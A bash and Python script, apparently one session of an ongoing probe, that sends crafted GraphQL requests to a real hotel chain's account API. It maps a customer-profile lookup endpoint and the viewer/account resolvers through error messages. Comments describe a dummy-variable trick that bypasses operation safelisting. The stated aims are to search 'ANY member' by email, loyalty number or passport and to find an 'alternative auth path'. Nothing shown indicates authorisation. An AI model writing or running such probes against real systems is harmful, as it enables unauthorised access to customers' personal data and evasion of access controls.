#!/usr/bin/env bash
# Session 24c — LookupCustomerProfilesInput/Response schema + viewer/account resolvers
# Goal: Map what lookupCustomerProfiles accepts + returns; explore viewer/account paths
# Date: 2026-06-25
# Key insight from S24b: lookupCustomerProfiles has NO registered safelisting (any var sig passes)

set -eo pipefail
mkdir -p /tmp/s24c

EP_LOOKUP='https://auth-apc.marriott.com/mi/query/phoenixAccountLookupCustomerProfiles'
EP_STATUS='https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails'
MY_CUST_ID='580EF43FAD482F46B04E29FE433CC4828.U1'

echo "========================================================"
echo "SESSION 24c — LookupCustomerProfiles schema + viewer/account"
echo "========================================================"
echo ""
echo "Key facts confirmed in S24b:"
echo "  - Resolver: lookupCustomerProfiles(input: LookupCustomerProfilesInput!)"
echo "  - Returns: LookupCustomerProfilesResponse (NOT Customer type)"
echo "  - Safelisting: NONE (any variable sig passes)"
echo "  - viewer and account root resolvers also exist"

# ---------------------------------------------------------------
# PHASE A: Refresh chunk URL (old one expired — 280 byte response)
# ---------------------------------------------------------------

echo ""
echo "======== PHASE A: Refresh chunk URL ========"

echo "--- A1: Fetch login page and extract current graphql-chunk URL ---"
curl -s 'https://auth-apc.marriott.com/login' \
  -H 'accept: text/html' \
  -o /tmp/s24c/login-page.html
echo "Login page: $(wc -c < /tmp/s24c/login-page.html) bytes"

python3 << 'PYEOF'
import re

with open("/tmp/s24c/login-page.html","r", errors="replace") as f:
    content = f.read()

# Find all chunk URLs in script src attributes
chunks = re.findall(r'/_next/static/chunks/[^"\']+\.js', content)
# Find build ID
build_ids = re.findall(r'web-rel-[\w.-]+', content)

print(f"Build IDs found: {list(set(build_ids))}")
print(f"Chunk URLs found ({len(chunks)}):")
for c in chunks:
    print(f"  https://auth-apc.marriott.com{c}")

# Look for graphql chunk specifically
graphql_chunks = [c for c in chunks if 'graphql' in c.lower()]
print(f"\nGraphQL chunk URLs: {graphql_chunks}")
with open("/tmp/s24c/chunk-urls.txt","w") as f:
    f.write("\n".join(f"https://auth-apc.marriott.com{c}" for c in chunks))
PYEOF

echo ""
echo "--- A2: Download fresh graphql-chunk (if URL found above) ---"
python3 << 'PYEOF'
import re, subprocess

with open("/tmp/s24c/chunk-urls.txt","r") as f:
    urls = [u.strip() for u in f.readlines()]

graphql_urls = [u for u in urls if 'graphql' in u.lower()]

if graphql_urls:
    url = graphql_urls[0]
    print(f"Downloading: {url}")
    r = subprocess.run(["curl","-s","-L",url,"-o","/tmp/s24c/graphql-chunk.js"],
        capture_output=True, text=True)
    import os
    size = os.path.getsize("/tmp/s24c/graphql-chunk.js")
    print(f"Downloaded: {size} bytes")
    if size < 1000:
        with open("/tmp/s24c/graphql-chunk.js","r") as f:
            print(f"Content: {f.read()[:200]}")
else:
    print("No graphql chunk URL found — will use GraphQL error-based enumeration only")
PYEOF


# ---------------------------------------------------------------
# PHASE B: LookupCustomerProfilesInput field enumeration
#
# We probe what fields LookupCustomerProfilesInput accepts.
# When we pass inline input with a known field name:
#   FIELD EXISTS → no "field not defined" error (may get 1012100 or other)
#   FIELD MISSING → "Field 'X' is not defined by type 'LookupCustomerProfilesInput'"
# ---------------------------------------------------------------

echo ""
echo "======== PHASE B: LookupCustomerProfilesInput field enumeration ========"
echo "Probing what search fields the input type accepts..."
echo ""

python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = "https://auth-apc.marriott.com/mi/query/phoenixAccountLookupCustomerProfiles"

# Probe candidate input fields
# We declare $dummy: String (unused) to bypass safelisting (S24b confirmed any sig works)
# Then inline the actual input fields: lookupCustomerProfiles(input: { field: "val" })
candidate_inputs = [
    # (field_name, field_value)
    ("email",          "test@test.com"),
    ("emailAddress",   "test@test.com"),
    ("loyaltyNumber",  "845440472"),
    ("loyaltyId",      "845440472"),
    ("memberId",       "845440472"),
    ("customerId",     "580EF43FAD482F46B04E29FE433CC4828.U1"),
    ("altCustId",      "580EF43FAD482F46B04E29FE433CC4828.U1"),
    ("phoneNumber",    "5551234567"),
    ("phone",          "5551234567"),
    ("firstName",      "John"),
    ("lastName",       "Doe"),
    ("lastName",       "Doe"),
    ("searchTerm",     "test@test.com"),
    ("query",          "test@test.com"),
    ("term",           "test@test.com"),
    ("identifier",     "test@test.com"),
    ("value",          "test@test.com"),
    ("id",             "580EF43FAD482F46B04E29FE433CC4828.U1"),
    ("externalId",     "580EF43FAD482F46B04E29FE433CC4828.U1"),
    ("bonvoyNumber",   "845440472"),
    ("rewardsNumber",  "845440472"),
    ("membershipId",   "845440472"),
    ("passport",       "AB123456"),
    ("passportNumber", "AB123456"),
]

# Dedup by field_name
seen = set()
unique_inputs = []
for item in candidate_inputs:
    if item[0] not in seen:
        seen.add(item[0])
        unique_inputs.append(item)

exists = []
missing = []

for (field_name, field_value) in unique_inputs:
    # Query: declare $dummy but call lookupCustomerProfiles with inline input
    query_str = f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{{field_name}: "{field_value}"}}) {{ __typename }} }}'
    payload = {
        "operationName": op,
        "variables": {"dummy": "x"},
        "query": query_str
    }
    with open("/tmp/s24c/input-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl","-s",ep,"-H","content-type: application/json",
         "-H","application-name: account","-d","@/tmp/s24c/input-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if "not defined by type" in body or "Unknown field" in body:
        missing.append(field_name)
        status = "MISSING (not in LookupCustomerProfilesInput)"
    elif "Field" in body and "is required" in body:
        exists.append(field_name)
        status = "EXISTS (field OK, but other required fields missing)"
    elif "expected type" in body.lower() or "Expected" in body:
        exists.append(field_name)
        status = "EXISTS (type mismatch — field IS defined)"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field_name)
        status = "EXISTS + upstream reached (1012100)"
    elif "FORBIDDEN" in body or "signature mismatch" in body:
        status = "SAFELISTING BLOCKED"
    elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" in body:
        exists.append(field_name)
        status = f"EXISTS (validation — different error: {body[:80]})"
    elif "Cannot query field" in body:
        status = f"OUTPUT FIELD MISSING — but input field MAY exist: {body[:80]}"
    else:
        status = f"OTHER: {body[:100]}"
    print(f"  input.{field_name}: {status}")

print(f"\n=== Input fields that EXIST: {exists}")
print(f"=== Input fields MISSING: {missing}")
with open("/tmp/s24c/input-fields.json","w") as f:
    import json as j
    j.dump({"exists": exists, "missing": missing}, f, indent=2)
PYEOF


# ---------------------------------------------------------------
# PHASE C: LookupCustomerProfilesResponse field enumeration
#
# We need to find what data comes back from a lookup.
# Use inline empty input {} to satisfy the required arg,
# then probe field names on the response type.
# ---------------------------------------------------------------

echo ""
echo "======== PHASE C: LookupCustomerProfilesResponse field enumeration ========"
echo "Probing what data fields exist on the response type..."
echo ""

python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = "https://auth-apc.marriott.com/mi/query/phoenixAccountLookupCustomerProfiles"

# Probe response fields
# Use an empty input {} — this will fail input validation but we may still get
# "Cannot query field X" errors revealing the response schema
response_fields = [
    "profiles",
    "customers",
    "results",
    "members",
    "hits",
    "matches",
    "items",
    "data",
    "total",
    "count",
    "totalCount",
    "pageInfo",
    "pagination",
    "customer",
    "profile",
    "id",
    "customerId",
    "memberId",
    "loyaltyNumber",
    "emailAddress",
    "firstName",
    "lastName",
    "name",
    "status",
    "found",
    "exists",
    "nextToken",
    "cursor",
]

exists = []
missing = []

for field_name in response_fields:
    # Try to query the field on the response type
    query_str = f'query {op}($dummy: String) {{ lookupCustomerProfiles(input: {{}}) {{ {field_name} }} }}'
    payload = {
        "operationName": op,
        "variables": {"dummy": "x"},
        "query": query_str
    }
    with open("/tmp/s24c/resp-probe.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(
        ["curl","-s",ep,"-H","content-type: application/json",
         "-H","application-name: account","-d","@/tmp/s24c/resp-probe.json"],
        capture_output=True, text=True, timeout=15
    )
    body = r.stdout

    if f'Cannot query field "{field_name}"' in body:
        missing.append(field_name)
        status = "MISSING"
    elif "not defined by type" in body and field_name not in body:
        # input error — field might still exist on response
        exists.append(field_name)
        status = f"POSSIBLE (input error — response schema not checked): {body[:80]}"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field_name)
        status = "EXISTS + upstream reached"
    elif "FORBIDDEN" in body:
        status = "SAFELISTING BLOCKED"
    elif "required" in body.lower() and field_name not in body:
        # Input validation error — means the response field didn't throw "Cannot query field"
        exists.append(field_name)
        status = "POSSIBLE EXISTS (input required error, not field missing error)"
    else:
        # Any other error — field may or may not exist
        if "never used" in body:
            exists.append(field_name)
            status = "BYPASS passed — probing response"
        else:
            status = f"UNCLEAR: {body[:100]}"
    print(f"  response.{field_name}: {status}")

print(f"\n=== Response fields that EXIST: {exists}")
print(f"=== Response fields MISSING: {missing}")
PYEOF


# ---------------------------------------------------------------
# PHASE D: viewer and account resolver exploration
# From S24b Phase D: viewer and account exist at root Query level
# viewer typically = current authenticated user (no id arg)
# account may be an account-level view
# ---------------------------------------------------------------

echo ""
echo "======== PHASE D: viewer and account resolver exploration ========"
echo ""

echo "--- D1: What type does viewer return? ---"
python3 << 'PYEOF'
import json, subprocess

ep = "https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails"
cid = "580EF43FAD482F46B04E29FE433CC4828.U1"

# viewer with no args (standard pattern)
payload = {
    "operationName": "phoenixAccountGetMemberStatusDetails",
    "variables": {"customerId": cid, "startYear": 2026},
    "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { viewer { __typename } }"
}
with open("/tmp/s24c/viewer-typename.json","w") as f:
    json.dump(payload, f)

r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24c/viewer-typename.json"],
    capture_output=True, text=True, timeout=15)
print(f"viewer __typename:\n{r.stdout}\n")

# account with no args
payload2 = {
    "operationName": "phoenixAccountGetMemberStatusDetails",
    "variables": {"customerId": cid, "startYear": 2026},
    "query": "query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) { account { __typename } }"
}
with open("/tmp/s24c/account-typename.json","w") as f:
    json.dump(payload2, f)

r2 = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
    "-H","application-name: account","-d","@/tmp/s24c/account-typename.json"],
    capture_output=True, text=True, timeout=15)
print(f"account __typename:\n{r2.stdout}\n")
PYEOF

echo ""
echo "--- D2: viewer field enumeration ---"
python3 << 'PYEOF'
import json, subprocess

ep = "https://auth-apc.marriott.com/mi/query/phoenixAccountGetMemberStatusDetails"
cid = "580EF43FAD482F46B04E29FE433CC4828.U1"

viewer_fields = [
    "id", "customerId", "altCustId", "memberId",
    "profile", "contactInformation", "loyaltyInformation",
    "email", "emailAddress", "firstName", "lastName",
    "isAuthenticated", "roles", "permissions",
    "customer", "member", "loyalty",
    "account", "session", "token",
    "bonvoyNumber", "loyaltyNumber", "membershipId",
]

exists = []
missing = []

for field in viewer_fields:
    payload = {
        "operationName": "phoenixAccountGetMemberStatusDetails",
        "variables": {"customerId": cid, "startYear": 2026},
        "query": f"query phoenixAccountGetMemberStatusDetails($customerId: ID!, $startYear: Int) {{ viewer {{ {field} }} }}"
    }
    with open("/tmp/s24c/viewer-probe.json","w") as f:
        json.dump(payload, f)
    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24c/viewer-probe.json"],
        capture_output=True, text=True, timeout=15)
    body = r.stdout

    if "Cannot query field" in body:
        missing.append(field)
        status = "MISSING"
    elif "1012100" in body or "UNAUTHORIZED" in body:
        exists.append(field)
        status = "EXISTS (upstream reached)"
    elif "GRAPHQL_VALIDATION_FAILED" in body and "never used" in body:
        exists.append(field)
        status = "EXISTS (field OK)"
    elif "FORBIDDEN" in body:
        status = "SAFELISTING BLOCKED"
    else:
        status = f"OTHER: {body[:80]}"
    print(f"  viewer.{field}: {status}")

print(f"\nviewer EXISTS: {exists}")
PYEOF

echo ""
echo "--- D3: lookupCustomerProfiles with actual inline input (bypass mode) ---"
echo "Test: can we call lookupCustomerProfiles with a plausible input inline?"
python3 << 'PYEOF'
import json, subprocess

op = "phoenixAccountLookupCustomerProfiles"
ep = f"https://auth-apc.marriott.com/mi/query/{op}"

# Try various inline input structures
# Goal: find one that passes GraphQL input validation (even without auth)
# An input validation PASS means the input structure is correct
test_inputs = [
    # label, inline input string, query_body
    ("email field",
     '{email: "test@example.com"}',
     "{ __typename }"),
    ("loyaltyNumber field",
     '{loyaltyNumber: "845440472"}',
     "{ __typename }"),
    ("identifier field",
     '{identifier: "test@example.com", identifierType: EMAIL}',
     "{ __typename }"),
    ("searchTerm field",
     '{searchTerm: "test@example.com"}',
     "{ __typename }"),
    ("email + loyaltyNumber",
     '{email: "test@example.com", loyaltyNumber: "845440472"}',
     "{ __typename }"),
    ("firstName + lastName",
     '{firstName: "John", lastName: "Doe"}',
     "{ __typename }"),
    ("bonvoyNumber",
     '{bonvoyNumber: "845440472"}',
     "{ __typename }"),
    ("memberLookupInput",
     '{memberLookupInput: {email: "test@example.com"}}',
     "{ __typename }"),
]

for (label, inline_input, body) in test_inputs:
    query_str = f"query {op}($dummy: String) {{ lookupCustomerProfiles(input: {inline_input}) {body} }}"
    payload = {"operationName": op, "variables": {"dummy": "x"}, "query": query_str}
    with open("/tmp/s24c/inline-test.json","w") as f:
        json.dump(payload, f)

    r = subprocess.run(["curl","-s",ep,"-H","content-type: application/json",
        "-H","application-name: account","-d","@/tmp/s24c/inline-test.json"],
        capture_output=True, text=True, timeout=15)
    body_resp = r.stdout

    if "not defined by type" in body_resp:
        # Get the field name that's not defined
        import re
        m = re.search(r"Field '(\w+)' is not defined", body_resp)
        status = f"INPUT FIELD WRONG: {m.group(0) if m else body_resp[:100]}"
    elif "required" in body_resp.lower() and "not provided" in body_resp:
        status = f"SOME REQUIRED FIELD MISSING: {body_resp[:150]}"
    elif "1012100" in body_resp or "UNAUTHORIZED" in body_resp:
        status = "INPUT VALID — upstream auth error (1012100) — CORRECT INPUT FORMAT"
    elif "Expected type" in body_resp:
        status = f"TYPE MISMATCH (field name correct, value type wrong): {body_resp[:100]}"
    elif "FORBIDDEN" in body_resp:
        status = "SAFELISTING BLOCKED"
    elif "Cannot query field" in body_resp:
        status = f"INPUT OK, RESPONSE FIELD WRONG: {body_resp[:100]}"
    elif "never used" in body_resp:
        status = "Input arg not used (body only has __typename) — try with response field"
    else:
        status = f"OTHER: {body_resp[:120]}"

    print(f"  [{label}]: {status}")
PYEOF


echo ""
echo "======== SESSION 24c COMPLETE ========"
echo ""
echo "=== KEY DECISION POINTS ==="
echo ""
echo "CRITICAL PATH — LookupCustomerProfiles:"
echo "  1. Phase B: Which fields does LookupCustomerProfilesInput accept?"
echo "     If 'email' or 'loyaltyNumber' exist → can search for ANY member"
echo ""
echo "  2. Phase D3: Which inline input format passes validation?"
echo "     '1012100 = INPUT VALID' → CORRECT FORMAT FOUND"
echo "     (then add auth cookies to get actual search results)"
echo ""
echo "  3. Phase C: What fields on LookupCustomerProfilesResponse?"
echo "     If 'profiles' or 'customers' exist → returns member list"
echo ""
echo "  4. Phase D2: viewer resolver fields?"
echo "     If viewer.profile or viewer.contactInformation → returns current user"
echo "     without needing customerId (alternative auth path)"
echo ""
echo "Paste full output for analysis."
